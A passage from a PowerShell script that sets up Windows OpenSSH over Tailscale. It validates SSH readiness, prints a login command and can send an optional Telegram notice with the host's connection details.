    $userSid = ([Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
    Assert-AuthorizedKeysReady -File $authFile -Directory $authDir -UserSid $userSid
    Assert-SshdHealthy -Port $Port
    Assert-SshFirewallReady -Port $Port
    Assert-SshBanner -Address $TailscaleIp -Port $Port
    $finalTailscaleIp = Assert-TailscaleReady -Attempts 3 -DelaySeconds 1
    if ($finalTailscaleIp -ne $TailscaleIp) {
        throw "Tailscale IPv4 address changed during setup ($TailscaleIp -> $finalTailscaleIp)"
    }
}

function Invoke-Setup {
    $FailedSteps.Clear()
    $script:ValidatedTailscaleIp = $null
    $tgConfig = if ($TgBotToken -and $TgChatId) {
        @{ Token = $TgBotToken; ChatId = $TgChatId }
    } else { $null }

    Write-Log 'Starting configuration (platform: Windows OpenSSH over Tailscale)'
    try {
        Invoke-RequiredStep 'Install Tailscale' { Install-Tailscale }
        Invoke-RequiredStep 'Tailscale service autostart' { Enable-TailscaleService }
        Invoke-RequiredStep 'Tailscale login' { Connect-Tailscale -AuthKey $TsAuthKey }
        Invoke-RequiredStep 'Validate Tailscale readiness' {
            $script:ValidatedTailscaleIp = Assert-TailscaleReady
        }
        Invoke-RequiredStep 'Enable OpenSSH Server' { Enable-OpenSSHServer }
        Invoke-RequiredStep 'Configure current-user public keys' { Set-AuthorizedKeys }
        Invoke-RequiredStep 'Enable X11 forwarding' { Enable-X11Forwarding }
        Invoke-RequiredStep 'Validate SSH server readiness' {
            Assert-SshServerReady -Port $SshPort -TailscaleIp $script:ValidatedTailscaleIp
        }
    } catch {
        Write-Host ''
        Write-Err 'SSH server setup failed.'
        foreach ($failure in $FailedSteps) { Write-Host "    - $failure" -ForegroundColor Yellow }
        $failureText = if ($FailedSteps.Count) { $FailedSteps -join "`n- " } else { $_.Exception.Message }
        $loginLine = $null
        if ($script:ValidatedTailscaleIp) {
            try {
                # A later optional/configuration step can fail after SSH is already usable.
                # Re-run the complete readiness contract before advertising a login command.
                Assert-SshServerReady -Port $SshPort -TailscaleIp $script:ValidatedTailscaleIp
                $loginLine = "ssh -p $SshPort $env:USERNAME@$script:ValidatedTailscaleIp"
                Write-Warn "Setup reported an error, but SSH is ready: $loginLine"
            } catch {
                Write-Warn "SSH login was not advertised because the post-failure readiness check did not pass: $($_.Exception.Message)"
            }
        }
        $sshLoginDetails = if ($loginLine) {
@"

SSH is still ready. Log in from another machine with a matching private key:
$loginLine
"@
        } else { '' }
        $failureMessage = @"
[FAILED] Windows OpenSSH server setup
Host: $env:COMPUTERNAME (Windows)
User: $env:USERNAME
Failure:
- $failureText
$sshLoginDetails
"@
        if ($tgConfig -and -not (Send-Telegram -Config $tgConfig -Text $failureMessage)) {
            Write-Warn 'Telegram failure notification could not be delivered.'
        }
        return 1
    }

    $publicIp = Get-PublicIp
    $loginLine = "ssh -p $SshPort $env:USERNAME@$script:ValidatedTailscaleIp"
    Write-Host ''
    Write-Host '==================== Summary ====================' -ForegroundColor Green
    Write-Log "This machine's Tailscale IP: $script:ValidatedTailscaleIp"
    Write-Log "Server-side SSH readiness checks passed: $loginLine"
    Write-Warn 'This is Windows OpenSSH over Tailscale; no Tailscale SSH badge is expected.'

    $successMessage = @"
[READY] Windows OpenSSH server-side checks passed
Host: $env:COMPUTERNAME (Windows)
User: $env:USERNAME
Tailscale IP: $script:ValidatedTailscaleIp
Public IP: $(if ($publicIp) { $publicIp } else { 'pending' })

Log in from another machine with a matching private key:
$loginLine

Note: Windows uses standard OpenSSH, so the Tailscale Machines page will not show a Tailscale SSH badge.
"@
    if ($tgConfig) {
        if (Send-Telegram -Config $tgConfig -Text $successMessage) {
            Write-Log 'Telegram readiness notification sent.'
        } else {
            Write-Warn 'SSH is ready, but the Telegram notification failed.'
        }
    }
    Write-Host 'All server-side readiness checks completed.' -ForegroundColor Green
    Write-Host '==================================================' -ForegroundColor Green
    return 0
}

if ($LibraryOnly) { return }
$setupExitCode = Invoke-Setup
if (-not $NoPause) { Wait-BeforeExit }
exit $setupExitCode
